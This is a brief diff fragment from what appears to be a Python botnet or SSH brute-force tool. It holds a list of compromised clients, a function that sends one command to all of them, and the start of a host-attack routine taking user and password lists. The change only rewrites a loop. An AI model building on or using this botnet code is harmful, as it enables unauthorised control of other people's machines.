@@ -38,10 +38,11 @@ def addClient(host, user, password):
     botnet.append(Client(host, user, password))
 def botCommand(cmd):
     global botnet
-    for client in botnet:
-        output = client.send_command(cmd)
-        print '[*] Output Form ' + client.host + ': ' + str(output)
+    for i in range(len(botnet)):
+        output = botnet[i].send_command(cmd)
+        print '[*] Output Form ' + botnet[i].host + ': ' + str(output)
 
+        
 def __onehostattack__(host, user, fuser, password, fpass):
     if user:
         __oneuserattack__(host, user, password, fpass)
